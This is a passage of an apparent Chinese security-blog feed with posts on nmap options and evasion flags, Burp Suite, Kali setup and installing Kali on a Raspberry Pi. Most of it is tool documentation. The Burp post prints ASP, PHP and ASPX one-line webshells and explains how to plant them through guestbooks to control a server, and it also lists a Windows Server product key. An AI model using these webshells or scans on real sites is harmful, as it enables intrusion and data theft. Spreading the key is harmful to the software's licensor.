调用的脚本传递的参数</span><br><span class="line">--script-args-file&#x3D;filename     使用文本传递参数</span><br><span class="line">--script-trace                  显示所有发送和接收到的数据</span><br><span class="line">--script-updatedb               更新脚本的数据库</span><br><span class="line">--script-help&#x3D;”Lua script”      显示指定脚本的帮助</span><br></pre></td></tr></table></figure></div><p>OS识别</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">-O              启用操作系统检测,-A来同时启用操作系统检测和版本检测</span><br><span class="line">--osscan-limit  针对指定的目标进行操作系统检测(至少需确知该主机分别有一个open和closed的端口)</span><br><span class="line">--osscan-guess  推测操作系统检测结果,当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认进行这种匹配</span><br></pre></td></tr></table></figure></div><p>防火墙/IDS躲避和哄骗</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">-f; --mtu value                 指定使用分片、指定数据包的MTU.</span><br><span class="line">-D decoy1,decoy2,ME             使用诱饵隐蔽扫描</span><br><span class="line">-S IP-ADDRESS                   源地址欺骗</span><br><span class="line">-e interface                    使用指定的接口</span><br><span class="line">-g&#x2F; --source-port PROTNUM       使用指定源端口  </span><br><span class="line">--proxies url1,[url2],...       使用HTTP或者SOCKS4的代理 </span><br><span class="line"></span><br><span class="line">--data-length NUM               填充随机数据让数据包长度达到NUM</span><br><span class="line">--ip-options OPTIONS            使用指定的IP选项来发送数据包</span><br><span class="line">--ttl VALUE                     设置IP time-to-live域</span><br><span class="line">--spoof-mac ADDR&#x2F;PREFIX&#x2F;VEBDOR  MAC地址伪装</span><br><span class="line">--badsum                        使用错误的checksum来发送数据包</span><br></pre></td></tr></table></figure></div><p>Nmap 输出</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">-oN                     将标准输出直接写入指定的文件</span><br><span class="line">-oX                     输出xml文件</span><br><span class="line">-oS                     将所有的输出都改为大写</span><br><span class="line">-oG                     输出便于通过bash或者perl处理的格式,非xml</span><br><span class="line">-oA BASENAME            可将扫描结果以标准格式、XML格式和Grep格式一次性输出</span><br><span class="line">-v                      提高输出信息的详细度</span><br><span class="line">-d level                设置debug级别,最高是9</span><br><span class="line">--reason                显示端口处于带确认状态的原因</span><br><span class="line">--open                  只输出端口状态为open的端口</span><br><span class="line">--packet-trace          显示所有发送或者接收到的数据包</span><br><span class="line">--iflist                显示路由信息和接口,便于调试</span><br><span class="line">--log-errors            把日志等级为errors&#x2F;warings的日志输出</span><br><span class="line">--append-output         追加到指定的文件</span><br><span class="line">--resume FILENAME       恢复已停止的扫描</span><br><span class="line">--stylesheet PATH&#x2F;URL   设置XSL样式表，转换XML输出</span><br><span class="line">--webxml                从namp.org得到XML的样式</span><br><span class="line">--no-sytlesheet         忽略XML声明的XSL样式表</span><br></pre></td></tr></table></figure></div><p>其他nmap选项</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">-6                      开启IPv6</span><br><span class="line">-A                      OS识别,版本探测,脚本扫描和traceroute</span><br><span class="line">--datedir DIRNAME       说明用户Nmap数据文件位置</span><br><span class="line">--send-eth &#x2F; --send-ip  使用原以太网帧发送&#x2F;在原IP层发送</span><br><span class="line">--privileged            假定用户具有全部权限</span><br><span class="line">--unprovoleged          假定用户不具有全部权限,创建原始套接字需要root权限</span><br><span class="line">-V                      打印版本信息</span><br><span class="line">-h                      输出帮助</span><br></pre></td></tr></table></figure></div><h1 id="0×04-例子"><a href="#0×04-例子" class="headerlink" title="0×04:例子"></a>0×04:例子</h1><hr><p>整个子网检测的Netbios</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">Nmap -sV -v -p 139,445 10.0.1.0&#x2F;24</span><br><span class="line">Starting Nmap 6.47 ( http:&#x2F;&#x2F;nmap.org ) at 2014-12-11 21:26 GMT</span><br><span class="line">Nmap scan report for nas.decepticons 10.0.1.12</span><br><span class="line">Host is up (0.014s latency).</span><br><span class="line"></span><br><span class="line">PORT STATE SERVICE VERSION</span><br><span class="line">139&#x2F;tcp open netbios-ssn Samba smbd 3.X (workgroup: MEGATRON)</span><br><span class="line">445&#x2F;tcp open netbios-ssn Samba smbd 3.X (workgroup: MEGATRON)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at http:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line"></span><br><span class="line">Nmap done: 256 IP addresses (1 hosts up) scanned in 28.74 seconds</span><br></pre></td></tr></table></figure></div><p>Nmap 查找Netbios名称</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">nmap -sU --script nbstat.nse -p 137 10.0.1.12</span><br><span class="line">Starting Nmap 6.47 ( http:&#x2F;&#x2F;nmap.org ) at 2014-12-11 21:26 GMT</span><br><span class="line">Nmap scan report for nas.decepticons 10.0.1.12</span><br><span class="line">Host is up (0.014s latency).</span><br><span class="line"></span><br><span class="line">PORT STATE SERVICE VERSION</span><br><span class="line">137&#x2F;udp open netbios-ns</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_nbstat: NetBIOS name: STARSCREAM, NetBIOS user: unknown, NetBIOS MAC: unknown (unknown) </span><br><span class="line">Nmap done: 256 IP addresses (1 hosts up) scanned in 28.74 seconds</span><br></pre></td></tr></table></figure></div><p>如果开启Netbios服务,检查是否存在漏洞</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">nmap --script-args&#x3D;unsafe&#x3D;1 --script smb-check-vulns.nse -p 445 10.0.0.1</span><br><span class="line"></span><br><span class="line">Nmap scan report for ie6winxp.decepticons (10.0.1.1)</span><br><span class="line">Host is up (0.00026s latency).</span><br><span class="line">PORT STATE SERVICE</span><br><span class="line">445&#x2F;tcp open microsoft-ds</span><br><span class="line">Host script results:</span><br><span class="line">| smb-check-vulns:</span><br><span class="line">| MS08-067: VULNERABLE</span><br><span class="line">| Conficker: Likely CLEAN</span><br><span class="line">| regsvc DoS: NOT VULNERABLE</span><br><span class="line">| SMBv2 DoS (CVE-2009-3103): NOT VULNERABLE</span><br><span class="line">|_ MS07-029: NO SERVICE (the Dns Server RPC service is inactive)</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 5.45 seconds</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;0×01-nmap功能介绍&quot;&gt;&lt;a href=&quot;#0×01-nmap功能介绍&quot; class=&quot;headerlink&quot; title=&quot;0×01:nmap功能介绍&quot;&gt;&lt;/a&gt;0×01:nmap功能介绍&lt;/h1&gt;&lt;hr&gt;
&lt;div</summary>
        
      
    
    
    
    <category term="Web" scheme="https://kabeor.github.io/categories/Web/"/>
    
    <category term="渗透" scheme="https://kabeor.github.io/categories/Web/%E6%B8%97%E9%80%8F/"/>
    
    <category term="工具集" scheme="https://kabeor.github.io/categories/Web/%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E9%9B%86/"/>
    
    
    <category term="Kali" scheme="https://kabeor.github.io/tags/Kali/"/>
    
    <category term="渗透" scheme="https://kabeor.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
    <category term="nmap" scheme="https://kabeor.github.io/tags/nmap/"/>
    
  </entry>
  
  <entry>
    <title>burpsuite 的配置和使用</title>
    <link href="https://kabeor.github.io/burpsuite%20%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
    <id>https://kabeor.github.io/burpsuite%20%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/</id>
    <published>2018-03-10T16:00:00.000Z</published>
    <updated>2020-05-03T04:38:39.439Z</updated>
    
    <content type="html"><![CDATA[<p>#burpsuite 的配置和使用<br>##主要模块<br>    1. Target(目标)——显示目标目录结构的的一个功能<br>    2. Proxy(代理)——拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。<br>    3. Spider(蜘蛛)——应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。<br>    4. Scanner(扫描器)——高级工具，执行后，它能自动地发现web 应用程序的安全漏洞。<br>    5. Intruder(入侵)——一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。<br>    6. Repeater(中继器)——一个靠手动操作来触发单独的HTTP 请求，并分析应用程序响应的工具。<br>    7. Sequencer(会话)——用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。<br>    8. Decoder(解码器)——进行手动执行或对应用程序数据者智能解码编码的工具。<br>    9. Comparer(对比)——通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。<br>    10. Extender(扩展)——可以让你加载Burp Suite的扩展，使用你自己的或第三方代码来扩展Burp Suit的功能。<br>    11. Options(设置)——对Burp Suite的一些设置<br>    12. Alerts(警告)——Burp Suite在运行过程中发生的一写错误</p><p>##环境配置<br>BurpSuite是用java开发的，所以要想使用这个工具、需先安装JDK</p><blockquote><p>设置浏览器代理</p></blockquote><p>选择手动配置代理LAN或HTTP（火狐）：127.0.0.1<br>端口 8080</p><p>##BurpSuite抓包</p><blockquote><p>基本步骤</p></blockquote><p>打开BurpSuite，Proxy-&gt;Options,确认代理配置正确<br>打开 intercept 确认intercept is on<br>在网页上输入，提交。此时intercept-&gt;Raw页上会显示post请求<br>ctrl+r或者右键send to repeater<br>打开Repeater-&gt;Raw，点击GO，右侧点击Render即可修改</p><p>#一句话木马<br>一句话木马短小精悍，能够远程控制，盗取数据</p><blockquote><p>常见一句话木马</p></blockquote><p>asp一句话木马：<br>　　<br>    &lt;%execute(request(“value”))%&gt;<br>php一句话木马：<br>　　<br>    <?php @eval($_POST[value]);?><br>aspx一句话木马：<br>　<br>    &lt;%@ Page Language=”Jscript”%&gt;<br>　    &lt;%eval(Request.Item[“value”])%&gt;</p><blockquote><p>使用方法</p></blockquote><p> 首先,找到数据库是asp格式的网站,然后,以留言板,或者发表文章的方式,把一句话添加到asp数据库，或者加进asp网页.<br>然后打开客户端(就是你电脑上面的那个htm文件),填上加入了一句话的asp文件,或者是asp网页,然后进入此网站服务器。</p><p>#Windows 2003 server的虚拟机安装和本地环境的搭建</p><blockquote><p>镜像地址</p></blockquote><pre><code>ed2k://|file|cn_win_srv_2003_r2_enterprise_x64_with_sp2_vl_cd1_X13-47314.iso|647686144|107F10D2A7FF12FFF0602FF60602BB37|/ </code></pre><blockquote><p>序列号</p></blockquote><pre><code>windows 2003 R2 Sp2 64位 企业版MR78C-GF2CY-KC864-DTG74-VMT73</code></pre><blockquote><p>使用phpstudy搭建本地环境</p></blockquote><p>1.安装phpstudy，记住www文件夹（这是网站源码的存放路径）<br>2.在网页搜索DedeCMS下载网站源码，下载织梦dedecms，压缩包为tar.gz文件<br>3.解压文件，将原来www文件夹内的所有文件删除，将解压后uploads内的所有文件复制进去<br>4.确认phpstudy处于工作状态<br>5.在浏览器中输入<br>    <a href="http://localhost/" target="_blank" rel="noopener">http://localhost/</a><br>  打开网页安装界面<br>6.填上数据库密码<br>7.完成后登录后台（验证码必须用英文输入法）<br>8.然后即可对网站进行编辑</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;#burpsuite 的配置和使用&lt;br&gt;##主要模块&lt;br&gt;    1. Target(目标)——显示目标目录结构的的一个功能&lt;br&gt;    2.</summary>
        
      
    
    
    
    <category term="Web" scheme="https://kabeor.github.io/categories/Web/"/>
    
    <category term="渗透" scheme="https://kabeor.github.io/categories/Web/%E6%B8%97%E9%80%8F/"/>
    
    <category term="工具集" scheme="https://kabeor.github.io/categories/Web/%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E9%9B%86/"/>
    
    
    <category term="Kali" scheme="https://kabeor.github.io/tags/Kali/"/>
    
    <category term="渗透" scheme="https://kabeor.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
    <category term="burpsuite" scheme="https://kabeor.github.io/tags/burpsuite/"/>
    
  </entry>
  
  <entry>
    <title>Kali的配置及问题解决方案</title>
    <link href="https://kabeor.github.io/Kali%E7%9A%84%E9%85%8D%E7%BD%AE%E5%8F%8A%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <id>https://kabeor.github.io/Kali%E7%9A%84%E9%85%8D%E7%BD%AE%E5%8F%8A%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</id>
    <published>2018-03-04T16:00:00.000Z</published>
    <updated>2020-03-16T04:44:55.595Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Kali的配置及问题解决方案"><a href="#Kali的配置及问题解决方案" class="headerlink" title="Kali的配置及问题解决方案"></a>Kali的配置及问题解决方案</h1><h2 id="桌面配置"><a href="#桌面配置" class="headerlink" title="桌面配置"></a>桌面配置</h2><blockquote><p>桌面主题风格</p></blockquote><pre><code>gnome-tweak-tool</code></pre><blockquote><p>安装Netspeed </p></blockquote><p>1、使用浏览器访问 <a href="https://github.com/hedayaty/NetSpeed，下载" target="_blank" rel="noopener">https://github.com/hedayaty/NetSpeed，下载</a> zip 格式文件包 ；</p><p>2、运行 gnome-tweak-tool，点选左侧 “Extensions”，然后将右侧的窗口拉到最下面，点击最右下角的（None）按钮；<br><a href="http://img.blog.csdn.net/20161019232638534" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="http://img.blog.csdn.net/20161019232638534" class="lazyload"></a><br><a href="http://img.blog.csdn.net/20161019232648128" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="http://img.blog.csdn.net/20161019232648128" class="lazyload"></a><br><a href="http://img.blog.csdn.net/20161019232743425" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="http://img.blog.csdn.net/20161019232743425" class="lazyload"></a></p><p>重启，更新</p><blockquote><p>实时查看系统变更</p></blockquote><pre><code>watch -n 2 tail -20 /var/log/message</code></pre><p>每两秒检查一次系统变更</p><blockquote><p>监视系统性能参数</p></blockquote><pre><code>top</code></pre><blockquote><p>终端中文支持和部分应用中文方块</p></blockquote><p>终端菜单栏选中”设定字符编码” 选择简体中文即可</p><p>方块字体直接更新系统即可</p><pre><code>dpkg-reconfigure locales</code></pre><p>打开图形界面，空格键选中</p><pre><code>en_US.UTF-8zh_CN.UTF-8</code></pre><p>将中文设置成默认后，重启即可</p><h2 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h2><blockquote><p>代理设置</p></blockquote><p>1.获取本机的ip<br>在命令行里输入ipconfig /all 获取本机IP，如下图所示，我本机ip为202.114.148.160<br>获取主机IP<br><a href="http://img.blog.csdn.net/20170319205043271?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvenpsMTI0Mzk3NjczMA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="http://img.blog.csdn.net/20170319205043271?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvenpsMTI0Mzk3NjczMA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" class="lazyload"></a></p><p>2.虚拟机网络连接设置<br>虚拟机网络连接设置为为NAT模式 </p><p>3.查看本机shadowsocks接口<br>shadowsocks代理端口一般默认为1080，双击小飞机图标就可查看，这里不贴图了</p><p>4.虚拟机网络设置代理<br>在虚拟机乌班图 系统设置-&gt;网络-&gt;网络代理里面，设置手动代理，ip填写步骤1中查看到的本机IP，端口设置为步骤3里查看到的shadowsocks的代理端口，我的如下图所示配置:<br>网络代理设置<br><a href="http://img.blog.csdn.net/20170319210056844?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvenpsMTI0Mzk3NjczMA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="http://img.blog.csdn.net/20170319210056844?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvenpsMTI0Mzk3NjczMA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" class="lazyload"></a><br>然后，就可以愉快的google了</p><blockquote><p>Tor</p></blockquote><pre><code>www.torproject.com</code></pre><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar -xvjf tor-browser-linux64-版本_语言.tar.xz</span><br><span class="line">cd tor-browser_语言</span><br><span class="line">.&#x2F;start-tor-browser.desktop</span><br></pre></td></tr></table></figure></div><p>监听端口（9150）</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat -pantu | grep tor</span><br></pre></td></tr></table></figure></div><blockquote><p>更新源代理</p></blockquote><pre><code>vi /etc/apt/apt.confAcquire::ftp::Proxy&quot;ftp://127.0.0.1:代理的侦听端口&quot;（如tor 9150）ftp可换为http,https,socks</code></pre><blockquote><p>软件使用代理</p></blockquote><pre><code>vi /etc/bash.bashrc添加export ftp_proxy=&quot;ftp://user:password@proxyIP:port&quot;ftp同样可以换若没有账号密码export ftp_proxy=&quot;http://127.0.0.1:侦听端口&quot;</code></pre><blockquote><p>终端下载网站内容</p></blockquote><pre><code>wget 下载地址</code></pre>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;Kali的配置及问题解决方案&quot;&gt;&lt;a href=&quot;#Kali的配置及问题解决方案&quot; class=&quot;headerlink&quot; title=&quot;Kali的配置及问题解决方案&quot;&gt;&lt;/a&gt;Kali的配置及问题解决方案&lt;/h1&gt;&lt;h2 id=&quot;桌面配置&quot;&gt;&lt;a</summary>
        
      
    
    
    
    <category term="Linux" scheme="https://kabeor.github.io/categories/Linux/"/>
    
    <category term="Kali" scheme="https://kabeor.github.io/categories/Linux/Kali/"/>
    
    
    <category term="Kali" scheme="https://kabeor.github.io/tags/Kali/"/>
    
    <category term="Linux" scheme="https://kabeor.github.io/tags/Linux/"/>
    
    <category term="配置" scheme="https://kabeor.github.io/tags/%E9%85%8D%E7%BD%AE/"/>
    
  </entry>
  
  <entry>
    <title>树莓派3B安装kali并优化</title>
    <link href="https://kabeor.github.io/%E6%A0%91%E8%8E%93%E6%B4%BE3B%E5%AE%89%E8%A3%85kali%E5%B9%B6%E4%BC%98%E5%8C%96/"/>
    <id>https://kabeor.github.io/%E6%A0%91%E8%8E%93%E6%B4%BE3B%E5%AE%89%E8%A3%85kali%E5%B9%B6%E4%BC%98%E5%8C%96/</id>
    <published>2018-02-09T16:00:00.000Z</published>
    <updated>2020-03-16T04:35:44.565Z</updated>
    
    <content type="html"><![CDATA[<h1 id="树莓派3B配置"><a href="#树莓派3B配置" class="headerlink" title="树莓派3B配置"></a>树莓派3B配置</h1><p><a href="https://i.loli.net/2018/07/16/5b4c7974a0121.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c7974a0121.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/16/5b4c7974d1933.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c7974d1933.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/16/5b4c79751207b.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c79751207b.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/16/5b4c79754525d.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c79754525d.jpg" class="lazyload"></a></p><blockquote><p>购买清单</p></blockquote><ol><li>树莓派3B</li><li>3.5寸KeDei高清触摸屏</li><li>亚克力外壳</li><li>5V2.5A充电插头及带开关充电线（减少充电口的损坏）</li><li>usb鼠标，键盘</li><li>网线</li><li>闪迪Class10 TF卡 32G</li><li>TF转USB转换器</li></ol><blockquote><p>树莓派3B硬件参数</p></blockquote><p>四核1.2GHz Broadcom BCM2837 64位CPU<br>1GB RAM<br>板载BCM43143 WiFi和蓝牙低能耗(BLE)<br>40引脚扩展GPIO<br>4个USB 2端口<br>4路立体声输出和复合视频端口<br>全尺寸HDMI<br>CSI照相机端口用于连接树莓派照相机<br>DSI显示端口用于连接树莓派触屏显示器.<br>微型SD端口, 用于下载操作系统以及存储数据.<br>升级切换的微型USB电源, 高达2.5A</p><h1 id="Kali系统的烧录"><a href="#Kali系统的烧录" class="headerlink" title="Kali系统的烧录"></a>Kali系统的烧录</h1><blockquote><p>使用软件 </p></blockquote><p>win32 DiskImager、SDFormatter</p><p>首先把SD卡连接到电脑，打开SDFormatter.注意观察盘符不要<br>误将其他SD卡格式化。<br><a href="https://i.loli.net/2018/07/16/5b4c7975590ee.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c7975590ee.jpg" class="lazyload"></a><br>接下来打开win32 diskimager.打开存放镜像的路径，点击<br>“write” /“yes” 等待镜像烧录成功。<br><a href="https://i.loli.net/2018/07/16/5b4c79756d014.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/16/5b4c79756d014.jpg" class="lazyload"></a></p><p>成功后装入树莓派，开机</p><h1 id="Kali系统优化"><a href="#Kali系统优化" class="headerlink" title="Kali系统优化"></a>Kali系统优化</h1><blockquote><p>拓展分区</p></blockquote><p>树莓派默认不会完整的使用整个SD卡空间，所以需要扩展分区 </p><p>针对树莓派最好的扩展工具是raspi-config，在kali1的源中也是存在的，但在2.0版本中则被移除了，只好手动安装。 </p><p>首先从<a href="http://archive.raspberrypi.org/debian/pool/main/r/raspi-config/" target="_blank" rel="noopener">http://archive.raspberrypi.org/debian/pool/main/r/raspi-config/</a> 下载最新的raspi-config，然后解决依赖： </p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install triggerhappy lua5.1  alsa-utils </span><br><span class="line">dpkg -i raspi-config_20151019_all.deb</span><br></pre></td></tr></table></figure></div><p> Expand Filesystem选项确认后即可<br><code>df -hl</code>查看设备内存</p><blockquote><p>安装kali组件 </p></blockquote><p>下载的镜像主要是kali的操作系统，可以认为是kali的框架，除了nmap,sqlmap这些名气很大的工具之外，其他的渗透工具像是metasploit默认是不安装的，要想使用kali的完全功能，需要把这些缺失的工具补上。 </p><p>首先运行apt-get update 更新缓存：<br><code>apt-cache search kali-</code><br>就可以看到一些kali的组件包,为了减少麻烦，把所有的组件全部装上：<br><code>apt-get install kali-linux-all</code><br>安装后有可能重启后不能使用</p><h1 id="Raspi-config主要配置选项"><a href="#Raspi-config主要配置选项" class="headerlink" title="Raspi-config主要配置选项"></a>Raspi-config主要配置选项</h1><h2 id="1、-Expand-Filesystem"><a href="#1、-Expand-Filesystem" class="headerlink" title="1、 Expand Filesystem"></a>1、 Expand Filesystem</h2><p>此选项为扩展文件系统，在安装完系统后，可以看到，根目录只有 3.5G，而使用的存储卡是16G的，所以要使用这个选项来扩展文件系统，将树莓派的更分区扩展到整个SD卡，在这个选项上按回车即可。</p><p>pi@raspberrypi:~ $ df -h<br>Filesystem Size Used Avail Use% Mounted on<br>/dev/root 3.5G 3.2G 97M 98% /<br>扩展完毕后提示如下，重启即可看到根分区已经扩展到整个SD卡了。</p><p>扩展文件系统完毕</p><h2 id="2、-Change-User-Password"><a href="#2、-Change-User-Password" class="headerlink" title="2、 Change User Password"></a>2、 Change User Password</h2><p>改变树莓派默认用户pi的密码，回车后输入新密码即可。</p><h2 id="3、-Boot-Options"><a href="#3、-Boot-Options" class="headerlink" title="3、 Boot Options"></a>3、 Boot Options</h2><p>启动时进入的环境选择，可以选择进入桌面环境或者字符环境。共有四个选择，可以按照实际情况来选择配置，这里我选择的是 B3 Desktop Desktop GUI, requiring user to login。</p><p>B1 Console Text console, requiring user to login<br>B2 Console Autologin Text console, automatically logged in as ‘pi’ user<br>B3 Desktop Desktop GUI, requiring user to login<br>B4 Desktop Autologin Desktop GUI, automatically logged in as ‘pi’ user</p><p>Choose whether to boot into a desktop environment or the command line</p><h2 id="4、Wait-for-Network-at-Boot"><a href="#4、Wait-for-Network-at-Boot" class="headerlink" title="4、Wait for Network at Boot"></a>4、Wait for Network at Boot</h2><p>这个选项是开机时是否等待网络连接，具体是干什么的我也不知道，大家有知道的可以告诉我。选项如下：</p><p>Chose boot option<br>Fast Boot without waiting for network connection<br>Slow Wait for network connection before completing boot</p><h2 id="5-Internationalisation-Options"><a href="#5-Internationalisation-Options" class="headerlink" title="5 Internationalisation Options"></a>5 Internationalisation Options</h2><p>国际化选项，可以更改默认语言，同时可以更改时区。</p><p>国际化选项<br>I1 Change Locale<br>区域和语言选择，这里建议不要修改，使用默认的设置就行，如果改为中文，使用是可能会出现乱码现象，建议不要修改的好，毕竟pi上的英语不是很难理解。</p><p>I2 Change Timezone<br>设置时区，如果树莓派上显示的时间不准确，选择中国的时区就可以解决这个问题。</p><p>选择Asia然后再选择Shanghai就可以解决树莓派上显示的时间不准确。</p><p>I3 Change Keyboard Layout<br>改变键盘布局，这里一般不用更改，选择默认的即可。</p><h2 id="6、-Enable-Camera"><a href="#6、-Enable-Camera" class="headerlink" title="6、 Enable Camera"></a>6、 Enable Camera</h2><p>启动树莓派的摄像头模块，如果安装了树莓派的摄像头模块，可以选择Enable启用，否则选择disable即可禁用。</p><h2 id="7、-Add-to-Rastrack"><a href="#7、-Add-to-Rastrack" class="headerlink" title="7、 Add to Rastrack"></a>7、 Add to Rastrack</h2><p>把你pi 的地理信息添加到地图，建议不用开启，免得泄漏自己信息，不过你要是开启的话也无所谓了。</p><h2 id="8、Overclock"><a href="#8、Overclock" class="headerlink" title="8、Overclock"></a>8、Overclock</h2><p>超频设置，平常一般不建议超频，如果觉得树莓派的性能太弱，自己需要用到超频的情况下，可以根据自己的需求选择合适的超频选项。共有6个超频选项。</p><p>None 700MHz ARM, 250MHz core, 400MHz SDRAM, 0 overvolt<br>Modest 800MHz ARM, 250MHz core, 400MHz SDRAM, 0 overvolt<br>Medium 900MHz ARM, 250MHz core, 450MHz SDRAM, 2 overvolt<br>High 950MHz ARM, 250MHz core, 450MHz SDRAM, 6 overvolt<br>Turbo 1000MHz ARM, 500MHz core, 600MHz SDRAM, 6 overvolt<br>Pi2 1000MHz ARM, 500MHz core, 500MHz SDRAM, 2 overvolt</p><p>超频选项</p><h2 id="9-Advanced-Options"><a href="#9-Advanced-Options" class="headerlink" title="9 Advanced Options"></a>9 Advanced Options</h2><p>高级设置</p><p>A1 Overscan<br>是否让内容全屏显示</p><p>A2 Hostname<br>设置主机名称</p><p>A3 Memory Split<br>内存分派，选择给GPU多少的内存</p><p>A4 SSH<br>是否开启SSH连接</p><p>A5 Device Tree<br>是否启用设备树（Device Tree）</p><p>A6 SPI<br>是否默认启动SPI内核驱动</p><p>A7 I2C<br>是否开启I2C接口</p><p>A8 Serial<br>是否开启串口</p><p>A9 Audio<br>选择声音默认输出是模拟口还是HDMI口，也可以选择 Auto 模式，会自动选择。</p><p>audio output选择</p><h2 id="10-About-raspi-config"><a href="#10-About-raspi-config" class="headerlink" title="10 About raspi-config"></a>10 About raspi-config</h2><p>raspi-config的相关信息。</p><p>This tool provides a straight-forward way of doing initial</p><p>configuration of the Raspberry 